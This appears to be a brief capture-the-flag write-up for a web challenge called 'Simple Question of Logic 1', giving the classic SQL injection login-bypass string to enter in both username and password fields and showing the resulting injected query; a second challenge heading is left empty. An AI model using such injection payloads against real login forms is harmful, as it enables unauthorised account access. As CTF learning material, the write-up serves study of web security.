## Simple Question of Logic 1
- use this in both fields ([ctf101](https://ctf101.org/web-exploitation/sql-injection/what-is-sql-injection/) . [sqlmap](https://d00mfist.gitbooks.io/ctf/content/sql-injections.html) . [hacktricks](https://book.hacktricks.xyz/pentesting-web/login-bypass))
```sh
# classic login bypass

' or '1'='1
' or '1'='1
```
- as if to say
```erlang
$query = "select * from users where user = '/null/' OR '1'='1' and pw = '/null/' OR '1'='1'";
```
## Simple Question of Logic 2
